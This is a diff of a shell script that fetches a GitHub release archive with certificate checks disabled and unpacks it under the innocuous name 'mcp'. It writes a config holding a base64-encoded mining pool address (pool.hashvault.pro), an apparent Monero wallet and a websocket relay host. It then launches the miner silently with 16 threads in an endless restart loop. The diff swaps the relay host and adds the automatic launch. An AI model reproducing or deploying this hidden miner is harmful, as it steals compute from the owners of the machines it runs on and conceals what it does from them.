@@ -4,15 +4,6 @@ curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
 sleep 40
-echo '#!/bin/bash
-
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 16 worker07 >/dev/null 2>&1
-sleep 30
-while true
-do
-        echo "Ngopi Boss..."
-        sleep 1800
-done' > bos.sh
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
@@ -28,7 +19,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://datacenter.dichoiseptoa.site
+echo "SERVER_WS=ws://preferred-callida-mono-e9a2882f.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
@@ -37,4 +28,4 @@ SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh
+done' > run.sh && chmod +x run.sh && ./run.sh 16 worker07 >/dev/null 2>&1
